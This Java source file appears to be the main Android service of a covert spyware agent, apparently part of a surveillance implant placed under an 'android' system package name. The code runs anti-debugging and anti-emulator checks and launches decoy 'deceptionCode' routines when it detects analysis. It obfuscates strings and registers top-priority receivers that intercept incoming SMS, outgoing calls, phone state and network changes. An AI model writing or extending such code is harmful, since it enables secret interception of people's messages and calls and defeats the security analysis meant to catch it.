package com.android.dvci;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Configuration;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.widget.Toast;

import com.android.dvci.auto.Cfg;
import com.android.dvci.listener.BAc;
import com.android.dvci.listener.BC;
import com.android.dvci.listener.BSm;
import com.android.dvci.listener.BSt;
import com.android.dvci.listener.WR;
import com.android.dvci.util.Check;
import com.android.mm.M;

/**
 * The Class ServiceCore.
 */
public class ServiceMain extends Service {
    private static final String TAG = "ServiceCore"; //$NON-NLS-1$

    BSt bst = new BSt();
    BAc bac = new BAc();
    BSm bsm = new BSm();
    BC bc = new BC();
    WR wr = new WR();

    private Core core;

    public long mersenne;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Status.setAppContext(getApplicationContext());

        // ANTIDEBUG ANTIEMU
        if (!Core.checkStatic()) {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (onCreate) anti emu/debug failed");
            }
	        if (Cfg.DEMO) {
		        Status.self().makeToast("RUNNING");
	        }

            return;
        }

        bst = new BSt();
        bac = new BAc();
        bsm = new BSm();
        bc = new BC();
        wr = new WR();

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    private long deceptionCode3() {
        long count = 0;

        for (long number = 2; number <= 360; number++) {
            if (isPrime(number)) {
                long mersennePrime = (long)(Math.pow(2, number)) - 1;
                if (isPrime(mersennePrime)) {
                    count += 1;
                }
            }
        }

        return count;
    }

    public static boolean isPrime(long number) {

        if ((number == 1) || (number == 2)) {
            return true;
        }

        for (int i = 2; i <= number/2; i++) {
            if (number % i == 0) {
                return false;
            }
        }

        return true;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onStart)"); //$NON-NLS-1$
        }

        // ANTIDEBUG ANTIEMU
        if (Core.checkStatic()) {

            // Core starts
            core = Core.newCore(this);
            core.Start(this.getResources(), getContentResolver());

            registerReceivers();

        } else {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (onStart) anti emu/debug failed");
                Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
            }

            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    Core.deceptionCode1();
                    mersenne = deceptionCode3();
                    Core.deceptionCode2(mersenne);
                }
            });
            thread.start();

        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        unregisterReceiver();

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }

        core.Stop();
        core = null;
    }

    private void registerReceivers() {
        IntentFilter intentFilter = new IntentFilter();
        registerReceiver(bst, intentFilter);
        registerReceiver(bac, intentFilter);

        IntentFilter iBsm = new IntentFilter();
        iBsm.setPriority(999999999);
        iBsm.addAction(M.e("android.provider.Telephony.SMS_RECEIVED"));
        registerReceiver(bsm, iBsm);

        IntentFilter iBc = new IntentFilter();
        iBc.setPriority(0);
        iBc.addCategory(M.e("android.intent.category.DEFAULT"));
        iBc.addAction(M.e("android.intent.action.NEW_OUTGOING_CALL"));
        iBc.addAction(M.e("android.intent.action.PHONE_STATE"));
        registerReceiver(bc, iBc);

        // WiFi status manager
        IntentFilter iWr = new IntentFilter();
        iWr.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        iWr.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(wr, iWr);

    }

    private void unregisterReceiver() {
        unregisterReceiver(bst);
        unregisterReceiver(bac);
        unregisterReceiver(bsm);
        unregisterReceiver(bc);
        unregisterReceiver(wr);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onConfigurationChanged)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onLowMemory)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onRebind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }
    }

    @Override
    public boolean onUnbind(Intent intent) {
        boolean ret = super.onUnbind(intent);

        if (Cfg.DEBUG) {
            Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
        }

        if (Cfg.DEMO) {
            Toast.makeText(this, M.e("(onUnbind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
        }

        return ret;
    }


}
